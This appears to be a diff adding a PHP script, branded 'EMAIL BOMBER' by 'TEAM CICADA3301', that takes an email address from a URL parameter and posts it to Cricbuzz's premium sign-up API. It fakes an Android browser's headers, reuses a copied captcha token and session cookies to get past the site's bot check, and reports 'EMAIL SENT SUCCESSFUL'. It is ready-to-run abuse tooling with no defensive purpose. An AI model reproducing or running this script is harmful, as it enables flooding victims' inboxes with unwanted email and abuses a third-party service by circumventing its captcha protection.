@@ -1,0 +1,77 @@
+<?php
+header('Content-Type: application/json; charset=utf-8');
+if (isset($_GET['email'])) {
+    $email = $_GET['email'];
+
+    $url = "https://m.cricbuzz.com/api/cbplus/auth/user/sign-up";
+
+    $data = json_encode([
+        "username" => $email,
+        "captchaToken" => "03AFcWeA5Y6sVOuTawWdDqxLUji28qvgg0Efjj8zdTAMhkA-8CvnR8C7p0kJu62cstg9x8-En2gOJ8a1K9AOc2ytLC2rJ7ldHJ6K-7wRgXOBjXjlYU9LZWnrY0BlPYNl1nG3eg9YkHEQUQtz6W-pUaUVPxwZZQJaad3Be7xlnR-blDOsCagOfEy3mu_bGI1vRfmzqDwfML2K4JuXVQcv10sjwVlttKWjDrSpXJAtyJVE_w1l_soNL55g7NqZXOa6f-4tUvs0HkU40tVRHRhbhjipKq1yGN76qJcT2DyNPALHcSkqP-luGfgJb8Ava2mMK8JgRZ-N7i6WwCGvja4LuGO3_1XALnt8C8N9BWbIpTHjX0J2U59kbxZPBN4XeEa1UT54658TU9iw_g8pq2q8mDprJDpm8DUiYqg25oPhTZbbQ4EzKGwJwsyHWusJWqjMuRzZZBb_CGgWIeWbiZxuQhdNmDRx89mEctbnvm_q9cvDmn4luMoHgiVDdYw0_dtz1-AhncKeHxGKMWckRFdT-pFIlF7r4mabsiMFNWYbZrFeUM_WEOMekN-uaSuhuVWu2Aekqa-zJImZAZAFCFBxSuFZn61VVccdl5N-66rTRnWMlMFfdV83BKPoDrtGljw2l-vaFaHYU4ZmAT_EppO2kWvVYBTwybnmiBG9TNztVhoMwPlxBuK5MHY3fdCi_4cN2PCL1lejt9EtNTNv_dyMcg0varpQRb5J6tnejvnlh7Ftw6tDUoIvQxGZds6el-2tpAnKX-4mJGzIXREHIully8wVKo_7gk2ME5sr8E1QBDwBHdy83UR8nC9aiKLlmsU8FoIX9fv7OjbXPgXFHc_MWZwbEG4nKbWyWQ5jZhEVrWFzZUi0evQ4ppPp8"
+    ]);
+
+    $headers = [
+        "Host: m.cricbuzz.com",
+        "Connection: keep-alive",
+        "Content-Length: " . strlen($data),
+        'sec-ch-ua: "Not)A;Brand";v="99", "Android WebView";v="127", "Chromium";v="127"',
+        "Content-Type: application/json",
+        "sec-ch-ua-mobile: ?1",
+        "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.103 Mobile Safari/537.36",
+        'sec-ch-ua-platform: "Android"',
+        "Accept: */*",
+        "Origin: https://m.cricbuzz.com",
+        "X-Requested-With: com.xbrowser.play",
+        "Sec-Fetch-Site: same-origin",
+        "Sec-Fetch-Mode: cors",
+        "Sec-Fetch-Dest: empty",
+        "Referer: https://m.cricbuzz.com/premium-subscription/user/sign-up",
+        "Accept-Encoding: gzip, deflate, br, zstd",
+        "Accept-Language: en-US,en;q=0.9",
+        "Cookie: cbzads=BD|not_set|not_set|DHAKA; _ga=GA1.1.1118000667.1724661267; __gads=ID=19d9432c64eb8859:T=1724661269:RT=1724661269:S=ALNI_Ma5ztII2Uxv1KXjTlN4ELbPhaBJPw; __gpi=UID=00000ed893b33284:T=1724661269:RT=1724661269:S=ALNI_MbO5-rcOCgTZ18OzmhXyWW-kqi18w; __eoi=ID=a9abe8a029b4b184:T=1724661269:RT=1724661269:S=AA-AfjbONNcC76m7Y7AEr5e1H8xy; _cc_id=819dc04ff5488487576f48f8dc514422; panoramaId_expiry=1724747673101; panoramaId=de0bec10db52bad48f9ba77c15c9a9fb927a6ee5aeb305267b903540ec9587ca; panoramaIdType=panoDevice; pageVisit=3; _ga_83LXEV4P47=GS1.1.1724661267.1.1.1724661282.45.0.0; FCNEC=%5B%5B%22AKsRol849ItA-ewqYSlekHEXKoqchSilOHgcIqt1FvulfxUQbsK0Id3GndkYeKVtKoMkjCDMSpayyHK6wMgXCND1d7YRqOlM-NiPwTsaTORXgui3jzOAgLlhLwpaPBNyxR2wBZgqACv8mxHPQqBsVFCk9iofnz6aHw%3D%3D%22%5D%5D"
+    ];
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+    $response = curl_exec($ch);
+
+    if (curl_errno($ch)) {
+        $error_msg = curl_error($ch);
+        curl_close($ch);
+        $result = [
+            "API NAME" => "EMAIL BOMBER",
+            "STATUS" => "ERROR",
+            "OWNER" => "CICADA3301",
+            "CHANNEL" => "TEAM CICADA3301",
+            "MESSAGE" => "cURL Error: $error_msg"
+        ];
+        echo json_encode($result, JSON_PRETTY_PRINT);
+        exit;
+    }
+
+    curl_close($ch);
+
+    // Customize the response
+    $customResponse = [
+        "API NAME" => "EMAIL BOMBER",
+        "STATUS" => "EMAIL SENT SUCCESSFUL",
+        "OWNER" => "CICADA3301",
+        "CHANNEL" => "TEAM CICADA3301",  // Decode JSON response to include in the output
+    ];
+
+    echo json_encode($customResponse, JSON_PRETTY_PRINT);
+} else {
+    $result = [
+        "API NAME" => "EMAIL BOMBER",
+        "STATUS" => "ERROR",
+        "OWNER" => "CICADA3301",
+        "CHANNEL" => "TEAM CICADA3301",
+        "MESSAGE" => "Please provide an email address."
+    ];
+    echo json_encode($result, JSON_PRETTY_PRINT);
+}
+?>
